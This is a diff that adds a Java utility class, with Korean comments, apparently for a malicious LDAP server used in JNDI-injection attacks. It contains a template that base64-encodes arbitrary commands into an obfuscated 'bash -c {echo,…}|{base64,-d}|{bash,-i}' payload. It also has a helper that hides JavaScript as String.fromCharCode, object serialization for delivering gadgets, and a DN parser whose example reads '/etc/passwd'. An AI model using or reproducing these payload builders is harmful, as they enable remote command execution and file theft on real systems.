@@ -1,0 +1,52 @@
+package org.mklinkj.ldapserver;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.util.ArrayList;
+import java.util.Base64;
+
+public class Utilities {
+  public static byte[] serialize(Object ref) throws IOException {
+    ByteArrayOutputStream out = new ByteArrayOutputStream();
+    ObjectOutputStream objOut = new ObjectOutputStream(out);
+    objOut.writeObject(ref);
+    return out.toByteArray();
+  }
+
+  public static String makeJavaScriptString(String str) {
+
+    ArrayList<String> result = new ArrayList<>(str.length());
+    for (int i = 0; i < str.length(); i++) {
+      Integer x = Character.codePointAt(str, i);
+      result.add(x.toString());
+    }
+    return "String.fromCharCode(" + String.join(",", result) + ")";
+  }
+
+  /**
+   * baseDN ldap 문자열에서 매개변수 값을 가져옴.<br>
+   * getDnParam("o=was2,file=/etc/passwd,xxx=yyy", "file") returns "/etc/passwd"
+   */
+  public static String getDnParam(String baseDN, String param) {
+    int startIndex = baseDN.indexOf(param + "=");
+    if (startIndex == -1) return null;
+
+    startIndex += param.length() + 1;
+    int endIndex = baseDN.indexOf(',', startIndex);
+    if (endIndex == -1) return baseDN.substring(startIndex);
+    else return baseDN.substring(startIndex, endIndex);
+  }
+
+  /**
+   * 모든 스크립트 내에서 안전하게 사용할 수 있도록 Base64로 bash 명령 인코딩
+   *
+   * @param command
+   * @return
+   */
+  public static String getBase64CommandTpl(String command) {
+    return "bash -c {echo,"
+        + Base64.getEncoder().encodeToString(command.getBytes())
+        + "}|{base64,-d}|{bash,-i}";
+  }
+}
